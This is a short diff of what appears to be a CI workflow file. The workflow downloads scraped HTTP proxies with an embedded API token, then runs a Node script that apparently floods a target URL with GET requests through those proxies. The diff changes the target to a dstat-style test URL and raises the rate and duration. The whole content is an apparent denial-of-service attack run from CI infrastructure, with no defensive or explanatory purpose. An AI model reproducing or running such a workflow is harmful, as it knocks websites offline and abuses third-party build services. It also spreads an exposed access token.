@@ -39,7 +39,7 @@ jobs:
           
           cd Fc-main
           curl -s "https://api.proxies.is/scraped?token=A4eH8m71mK2U57785S5c3&timeout=15000&excludeCountry=IN&includeCountry=IN&type=http" -o woo.txt
-          node a.js GET https://aurixprivate.online 300 4 1 proxy.txt  --debug  --full
+          node a.js GET https://c3.dstatbot.win/HAYgcPpP 400 4 30 woo.txt  --debug  --full
         
           
           
